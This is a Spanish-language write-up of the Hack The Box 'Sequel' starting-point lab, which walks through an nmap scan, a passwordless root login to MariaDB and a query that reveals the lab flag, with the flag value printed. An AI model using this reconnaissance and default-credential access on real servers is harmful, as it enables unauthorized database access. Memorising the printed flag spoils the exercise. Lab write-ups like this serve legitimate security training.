---
title: Sequel
date: 2025-04-5 00:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, sequel, mysql]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/b783687f4acd9b12249440c9a8105e46.png
    alt: Hack The Box
---
## Sequel
De nuevo como todas estas máquinas de starting point. El reto consiste en ir contestando a las preguntas 
estas están relacionadas con el servicio de MySQL.

## Task 1
``` shell
$ nmap -p- 10.129.190.45  -vv
During our scan, which port do we find serving MySQL?
Scanning 10.129.16.98 [65535 ports]
Discovered open port 3306/tcp on 10.129.16.98
```
> 3306

## Task 2

What community-developed MySQL version is the target running?

Para descubrir la versión de la DB nos valemos de los scripts de nmap usando el flag **-sC**
``` shell
┌──(kali㉿kali25)-[/etc/openvpn]
└─$ nmap -p 3306 -sC  10.129.190.45 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 15:45 EDT
Nmap scan report for 10.129.190.45
Host is up (0.047s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 40
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, LongColumnFlag, DontAllowDatabaseTableColumn, Support41Auth, SupportsTransactions, Speaks41ProtocolOld, IgnoreSigpipes, ConnectWithDatabase, SupportsLoadDataLocal, InteractiveClient, Speaks41ProtocolNew, SupportsCompression, ODBCClient, FoundRows, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: H"q5Ptx{&DeP?,^sHN1E
|_  Auth Plugin Name: mysql_native_password

Nmap done: 1 IP address (1 host up) scanned in 64.45 seconds

```
>MariaDB

## Task 3

When using the MySQL command line client, what switch do we need to use in order to specify a login username?

## Task 4
> -u

Which username allows us to log into this MariaDB instance without providing a password?

Usamos **--skip-ssl** para solucionar el problema de conectividad que presenta la máquina de SSL 
``` shell
┌──(kali㉿kali25)-[/etc/openvpn]
└─$ mysql -u root  -h  10.129.190.45 
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
┌──(kali㉿kali25)-[/etc/openvpn]
└─$ mysql -u root  -h 10.129.190.45 --skip-ssl
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 48
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

## Task 5
>root

In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?

## Task 6
> *

In SQL, what symbol do we need to end each query with?

## Task 7
> ;

There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?
``` shell
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.053 sec)
```
> htb

## Submit Flag

``` shell
MariaDB [(none)]> use htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.247 sec)

MariaDB [htb]> select * from config
    -> ;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.498 sec)

MariaDB [htb]> 

```

## Submit root flag [achivement](https://www.hackthebox.com/achievement/machine/2336390/403)